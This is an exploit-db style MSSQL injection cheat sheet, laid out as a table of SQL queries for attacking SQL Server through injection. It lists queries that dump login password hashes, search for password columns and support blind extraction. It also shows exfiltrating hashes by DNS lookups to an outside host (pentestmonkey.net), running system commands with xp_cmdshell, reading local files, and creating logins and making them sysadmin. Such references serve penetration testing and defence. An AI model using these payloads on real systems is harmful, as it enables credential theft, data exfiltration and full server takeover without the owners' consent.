<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>exploit-db paper</title>
</head><body>########################################	<br/>
[0x05] - MSSQL Injection Cheat Sheet<br/>
########################################<br/>
<br/>
		** Some of the queries in the table below can only be run by an admin (SA Privilege). <br/>
	These are marked with &quot;-- priv&quot; at the end of the query. **<br/>
<br/>
	+---------------+---------------------------------------------------------------------------+<br/>
	|  Version  | SELECT @@version							  |<br/>
	|---------------|---------------------------------------------------------------------------|<br/>
	|  Comments  | SELECT 1 -- comment							  |<br/>
	|        | SELECT /*comment*/1							  |<br/>
	|---------------|---------------------------------------------------------------------------|<br/>
	|		| SELECT user_name();							  |<br/>
	|        | SELECT system_user;							  |<br/>
	| Current User	| SELECT user;								  |<br/>
	|        | SELECT loginame FROM master..sysprocesses WHERE spid = @@SPID		  |<br/>
	|---------------|---------------------------------------------------------------------------|<br/>
	| List Users  | SELECT name FROM master..syslogins					  |<br/>
	|---------------|---------------------------------------------------------------------------|<br/>
	|		| MSSQL2000: SELECT name, password FROM master..sysxlogins -- priv	  |<br/>
	|		|									  |<br/>
	|  		|	   SELECT name, master.dbo.fn_varbintohexstr(password)      |<br/>
	| 		|	   FROM master..sysxlogins -- priv				  |<br/>
	| List Password |									  |<br/>
	|  Hashes	| MSSQL2005: SELECT name, password_hash FROM				  |<br/>
	|		|	   master.sys.sql_logins -- priv				  |<br/>
	|  		|									  |<br/>
	|		|	   SELECT name + '-' +					  |<br/>
	|		|	   master.sys.fn_varbintohexstr(password_hash)		  |<br/>
	|		|	   FROM master.sys.sql_logins -- priv				  |<br/>
	|---------------|---------------------------------------------------------------------------|<br/>
	| 		| SELECT is_srvrolemember('sysadmin'); -- is your account a sysadmin?	  |<br/>
	|		| returns 1 for true, 0 for false, NULL for invalid role.		  |<br/>
	|		| Also try 'bulkadmin',	'systemadmin' and other values.			  |<br/>
	|  List DBA	| 									  |<br/>
	|  Accounts	|									  |<br/>
	| 		| SELECT is_srvrolemember('sysadmin', 'sa'); -- is sa a sysadmin?	  |<br/>
	|		| return 1 for true, 0 for false, NULL for invalid role/username.	  |<br/>
	|---------------|---------------------------------------------------------------------------|<br/>
	|  Current DB | SELECT DB_NAME()							  |<br/>
	|---------------|---------------------------------------------------------------------------|<br/>
	|   List	| SELECT name FROM master..sysdatabases;				  |<br/>
	|  Databases	| SELECT DB_NAME(N); -- for N = 0, 1, 2, ...				  |<br/>
	|---------------|---------------------------------------------------------------------------|<br/>
	|		| SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE  |			  <br/>
	|		| name = 'mytable'); -- for the current DB only				  |<br/>
	|		|									  |<br/>
	| List Columns	| SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM |<br/>
	|		| master..syscolumns, master..sysobjects WHERE				  |<br/>
	|		| master..syscolumns.id=master..sysobjects.id AND			  |<br/>
	|		| master..sysobjects.name='sometable'; -- list colum names		  |<br/>
	|		| and types for master..sometable					  |<br/>
	|---------------|---------------------------------------------------------------------------|<br/>
	|		| SELECT name FROM master..sysobjects WHERE xtype = 'U';		  |<br/>
	|		| (Use xtype = 'V' for views)						  |<br/>
	|		| SELECT name FROM someotherdb..sysobjects WHERE xtype = 'U';		  |<br/>
	|		|									  |<br/>
	| List Tables	| SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype)	  |<br/>
	|		| FROM master..syscolumns, master..sysobjects WHERE			  |<br/>
	|		| master..syscolumns.id=master..sysobjects.id AND			  |<br/>
	|		| master..sysobjects.name='sometable'; -- list column names and types	  |<br/>
	|		| for master..sometable							  |<br/>
	|---------------|---------------------------------------------------------------------------|<br/>
	| 		| -- NB: This example works only for the current database.		  |<br/>
	|		| If you wan't to search another db, you need to specify the db name	  |<br/>
	| Find Tables	| (e.g. replace sysobject with mydb..sysobjects).			  |<br/>
	|   From	|									  |<br/>
	| Column Name	| SELECT sysobjects.name as tablename, syscolumns.name as columnname	  |<br/>
	|		| FROM sysobjects JOIN syscolumns ON sysobjects.id = syscolumns.id	  |<br/>
	|		| WHERE sysobjects.xtype = 'U' AND syscolumns.name LIKE '%PASSWORD%' --	  |<br/>
	|		| this lists table, column for each column containing the word 'password'  |<br/>
	|---------------|---------------------------------------------------------------------------|<br/>
	|  Select	| SELECT TOP 1 name FROM (SELECT TOP 9 name FROM master..syslogins	  |<br/>
	|  Nth Row	| ORDER BY name ASC) sq ORDER BY name DESC -- gets 9th row		  |<br/>
	|---------------|---------------------------------------------------------------------------|<br/>
	|Select Nth Char| SELECT substring('abcd', 3, 1) -- returns c				  |<br/>
	|---------------|---------------------------------------------------------------------------|<br/>
	| Bitwise AND | SELECT 6 &amp; 2 -- returns 2						  |<br/>
	|		| SELECT 6 &amp; 1 -- returns 0						  |<br/>
	|---------------|---------------------------------------------------------------------------|<br/>
	| ASCII Value	| SELECT char(0x41) -- returns A					  |<br/>
	|  -&gt; Char	|									  |<br/>
	|---------------|---------------------------------------------------------------------------|<br/>
	| Char -&gt; ASCII | SELECT ascii('A') - returns 65					  |<br/>
	|   Value	|									  |<br/>
	|---------------|---------------------------------------------------------------------------|<br/>
	|  Casting  | SELECT CAST('1' as int);						  |<br/>
	|		| SELECT CAST(1 as char)						  |<br/>
	|---------------|---------------------------------------------------------------------------|<br/>
	|  String	| SELECT 'A' + 'B' - returns AB						  |<br/>
	| Concatenation |									  |<br/>
	|---------------|---------------------------------------------------------------------------|<br/>
	| If Statement | IF (1=1) SELECT 1 ELSE SELECT 2 -- returns 1				  |<br/>
	|---------------|---------------------------------------------------------------------------|<br/>
	|Case Statement | SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END -- returns 1			  |<br/>
	|---------------|---------------------------------------------------------------------------|<br/>
	|Avoiding Quotes| SELECT char(65)+char(66) -- returns AB				  |<br/>
	|---------------|---------------------------------------------------------------------------|<br/>
	| Time Delay  | WAITFOR DELAY '0:0:5' -- pause for 5 seconds				  |<br/>
	|---------------|---------------------------------------------------------------------------|<br/>
	|		| declare @host varchar(800); select @host = name FROM master..syslogins;  |<br/>
	|		| exec('master..xp_getfiledetails ''\\' + @host + '\c$\boot.ini''');	  |<br/>
	|		| -- nonpriv, works on 2000						  |<br/>
	|		|									  |<br/>
	|		| declare @host varchar(800); select @host = name + '-' +		  |<br/>
	|   Make	| master.sys.fn_varbintohexstr(password_hash) + '.2.pentestmonkey.net'	  |<br/>
	| DNS Requests	| from sys.sql_logins; exec('xp_fileexist ''\\' + @host + '\c$\boot.ini''');|<br/>
	|		| -- priv, works on 2005						  |<br/>
	|		|									  |<br/>
	|		| -- NB: Concatenation is not allowed in calls to these SPs, hence why we  |<br/>
	|		| have to use @host. Messy but necessary.				  |<br/>
	|		| -- Also check out theDNS tunnel feature of sqlninja			  |<br/>
	|---------------|---------------------------------------------------------------------------|<br/>
	|  Command	| EXEC xp_cmdshell 'net user'; -- priv					  |<br/>
	|  Execution  |									  |<br/>
	|---------------|---------------------------------------------------------------------------|<br/>
	|   Local	| CREATE TABLE mydata (line varchar(8000));				  |<br/>
	| File Access	| BULK INSERT mydata FROM 'c:\boot.ini';				  |<br/>
	|		| DROP TABLE mydata;							  |<br/>
	|---------------|---------------------------------------------------------------------------|<br/>
	| Hostname, IP | SELECT HOST_NAME()							  |<br/>
	|---------------|---------------------------------------------------------------------------|<br/>
	| Create Users | EXEC sp_addlogin 'user', 'pass'; -- priv				  |<br/>
	|---------------|---------------------------------------------------------------------------|<br/>
	| Drop Users  | EXEC sp_droplogin 'user'; -- priv					  |<br/>
	|---------------|---------------------------------------------------------------------------|<br/>
	| Make User DBA | EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin; -- priv	  |<br/>
	+---------------+---------------------------------------------------------------------------+</body></html>